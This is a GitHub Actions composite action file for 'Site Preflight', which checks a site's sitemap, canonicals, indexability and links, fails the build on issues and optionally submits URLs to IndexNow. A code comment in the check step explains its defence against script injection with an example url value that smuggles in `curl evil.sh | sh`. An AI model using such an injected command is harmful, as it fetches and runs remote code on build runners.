name: 'Site Preflight'
description: 'Fail the build when a deploy breaks your sitemap, canonicals, indexability or internal links — then ping IndexNow.'
author: 'Fable Reports'
branding:
  icon: 'check-circle'
  color: 'yellow'

inputs:
  url:
    description: 'Site to check, e.g. https://example.com'
    required: true
  limit:
    description: 'Maximum pages to check from the sitemap'
    required: false
    default: '50'
  fail-on-issues:
    description: 'Fail the workflow when issues are found. Set false to report without blocking.'
    required: false
    default: 'true'
  indexnow-key:
    description: 'IndexNow key. When set, submits the sitemap URLs to Bing/Yandex/Seznam/Naver after a clean check.'
    required: false
    default: ''

outputs:
  issues:
    description: 'Number of issues found'
    value: ${{ steps.check.outputs.issues }}
  report:
    description: 'The full report as text'
    value: ${{ steps.check.outputs.report }}

runs:
  using: 'composite'
  steps:
    - id: check
      shell: bash
      # Inputs are passed through env, never interpolated into the script body:
      # `${{ }}` is expanded by the runner before bash parses the line, so a url of
      # `"; curl evil.sh | sh; "` would run as shell. Keep every input in env.
      env:
        ACTION_PATH: ${{ github.action_path }}
        INPUT_URL: ${{ inputs.url }}
        INPUT_LIMIT: ${{ inputs.limit }}
        INPUT_FAIL_ON_ISSUES: ${{ inputs.fail-on-issues }}
        INPUT_INDEXNOW_KEY: ${{ inputs.indexnow-key }}
      run: |
        set -o pipefail
        REPORT_FILE="$(mktemp)"
        # $ACTION_PATH is this action's checkout — run the pinned code,
        # not whatever npx would resolve today.
        node "$ACTION_PATH/index.mjs" check "$INPUT_URL" \
          --limit "$INPUT_LIMIT" 2>&1 | tee "$REPORT_FILE" || true
        ISSUES=$(grep -oE '^[[:space:]]+([0-9]+) issue' "$REPORT_FILE" | grep -oE '[0-9]+' | head -1)
        ISSUES="${ISSUES:-0}"
        echo "issues=$ISSUES" >>"$GITHUB_OUTPUT"
        # Random delimiter: the report echoes text from the target site, so a fixed one
        # could be closed early by a page whose title contains it.
        DELIM="SITEPREFLIGHT_EOF_${RANDOM}${RANDOM}${RANDOM}"
        {
          echo "report<<$DELIM"
          cat "$REPORT_FILE"
          echo "$DELIM"
        } >>"$GITHUB_OUTPUT"
        {
          echo '## Site preflight'
          echo
          echo '```'
          cat "$REPORT_FILE"
          echo '```'
        } >>"$GITHUB_STEP_SUMMARY"

        if [ -n "$INPUT_INDEXNOW_KEY" ] && [ "$ISSUES" = "0" ]; then
          node "$ACTION_PATH/index.mjs" submit "$INPUT_URL" \
            --key "$INPUT_INDEXNOW_KEY" || true
        fi

        if [ "$INPUT_FAIL_ON_ISSUES" = "true" ] && [ "$ISSUES" != "0" ]; then
          echo "::error::site preflight found $ISSUES issue(s) — see the job summary"
          exit 1
        fi
